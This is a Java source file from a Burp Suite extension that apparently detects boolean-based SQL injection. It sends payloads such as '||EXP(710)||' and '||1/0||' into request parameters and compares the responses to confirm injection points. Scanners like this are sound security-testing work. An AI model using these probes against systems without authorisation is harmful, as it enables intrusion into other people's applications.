/*
 * @saoshao<1224165231@qq.com>
 */

package DetSql.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import DetSql.config.DetSqlConfig;
import DetSql.logging.DetSqlLogger;
import DetSql.model.PocLogEntry;
import DetSql.ui.DetSqlUI;
import DetSql.util.MyCompare;
import DetSql.util.ParameterModifiers;
import DetSql.util.RegexUtils;
import DetSql.util.Statistics;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import DetSql.util.ParameterModifier;


/**
 * 布尔注入策略
 * 
 * 检测逻辑（4 步）：
 * 1. '||EXP(710)||' - 触发数值溢出，期望错误/不同响应
 * 2a. '||EXP(290)||' (主要) - 正常指数值，期望与步骤 1 不同
 * 2b. '||1/0||' (备选) - 除以零，某些数据库会优雅处理
 * 3. '||1/1||' - 正常结果（1），期望与步骤 2 的成功响应相似
 */
public class BooleanInjection extends AbstractInjectionStrategy {
    
    private static final String VULN_TYPE = "boolsql";
    private final DetSqlUI ui;
    
    public BooleanInjection(
        MontoyaApi api,
        DetSqlConfig config,
        DetSqlLogger logger,
        Statistics statistics,
        Map<String, List<PocLogEntry>> attackMap,
        DetSqlUI ui
    ) {
        super(api, config, logger, statistics, attackMap);
        this.ui = ui;
    }
    
    @Override
    public String getName() {
        return "Boolean-Based";
    }
    
    @Override
    public String getVulnType() {
        return VULN_TYPE;
    }
    
    @Override
    public boolean isEnabled() {
        return ui.isBoolCheckSelected();
    }
    
    @Override
    public boolean testParameter(
        HttpRequest sourceRequest,
        String sourceBody,
        boolean htmlFlag,
        ParsedHttpParameter param,
        ParameterModifier modifier,
        String requestHash
    ) throws InterruptedException {
        
        checkInterrupted();
        
        String paramName = param.name();
        if (shouldSkipParameter(paramName)) {
            return false;
        }
        
        List<PocLogEntry> pocEntries = new ArrayList<>();
        String referenceBody;  // 用于最后一步比较的参考响应
        
        // 步骤 1: '||EXP(710)||' - 触发溢出
        HttpRequest req1 = modifier.modifyParameter(sourceRequest, param, "'||EXP(710)||'", 0);
        HttpRequestResponse resp1 = sendHttpRequest(req1, 2);
        String body1 = extractResponseBody(resp1);
        
        List<Double> sim1 = MyCompare.averageLevenshtein(sourceBody, body1, "", "", htmlFlag);
        double minSim1 = Collections.min(sim1);
        
        if (minSim1 > config.getSimilarityThreshold()) {
            // 失败：EXP(710) 没有改变响应 → 不可能是注入点
            return false;
        }
        
        pocEntries.add(PocLogEntry.fromResponse(
            paramName, "'||EXP(710)||'", MyCompare.formatPercent(minSim1),
            VULN_TYPE, resp1, requestHash
        ));
        
        // 步骤 2a: '||EXP(290)||' - 正常值（主要路径）
        HttpRequest req2 = modifier.modifyParameter(sourceRequest, param, "'||EXP(290)||'", 0);
        HttpRequestResponse resp2 = sendHttpRequest(req2, 2);
        String body2 = extractResponseBody(resp2);
        
        List<Double> sim2 = MyCompare.averageLevenshtein(body1, body2, "", "", htmlFlag);
        double minSim2 = Collections.min(sim2);
        
        if (minSim2 <= config.getSimilarityThreshold()) {
            // 成功：EXP(290) 与 EXP(710) 响应不同
            pocEntries.add(PocLogEntry.fromResponse(
                paramName, "'||EXP(290)||'", MyCompare.formatPercent(minSim2),
                VULN_TYPE, resp2, requestHash
            ));
            referenceBody = body2;
        } else {
            // 步骤 2b: '||1/0||' - 备选路径（Division by zero）
            String divZeroPayload = modifier.needsUrlEncoding() ? "'||1%2F0||'" : "'||1/0||'";
            
            HttpRequest req2b = modifier.modifyParameter(sourceRequest, param, divZeroPayload, 0);
            HttpRequestResponse resp2b = sendHttpRequest(req2b, 2);
            String body2b = extractResponseBody(resp2b);
            
            List<Double> sim2b = MyCompare.averageLevenshtein(sourceBody, body2b, "", "'||1/0||'", htmlFlag);
            double maxSim2b = Collections.max(sim2b);
            
            if (maxSim2b <= config.getSimilarityThreshold()) {
                // 失败：备选路径也失败
                return false;
            }
            
            pocEntries.add(PocLogEntry.fromResponse(
                paramName, divZeroPayload, MyCompare.formatPercent(maxSim2b),
                VULN_TYPE, resp2b, requestHash
            ));
            referenceBody = body2b;
        }
        
        // 步骤 3: '||1/1||' - 应该与步骤 2 相似
        String divOnePayload = modifier.needsUrlEncoding() ? "'||1%2F1||'" : "'||1/1||'";
        
        HttpRequest req3 = modifier.modifyParameter(sourceRequest, param, divOnePayload, 0);
        HttpRequestResponse resp3 = sendHttpRequest(req3, 2);
        String body3 = extractResponseBody(resp3);
        
        List<Double> sim3 = MyCompare.averageLevenshtein(referenceBody, body3, "EXP\\(290\\)", "1/1", htmlFlag);
        double maxSim3 = Collections.max(sim3);
        
        if (maxSim3 > config.getSimilarityThreshold()) {
            // 成功：1/1 与参考响应相似 → 确认 Boolean 注入
            pocEntries.add(PocLogEntry.fromResponse(
                paramName, divOnePayload, MyCompare.formatPercent(maxSim3),
                VULN_TYPE, resp3, requestHash
            ));
            getAttackList(requestHash).addAll(pocEntries);
            return true;
        }
        
        return false;
    }
}
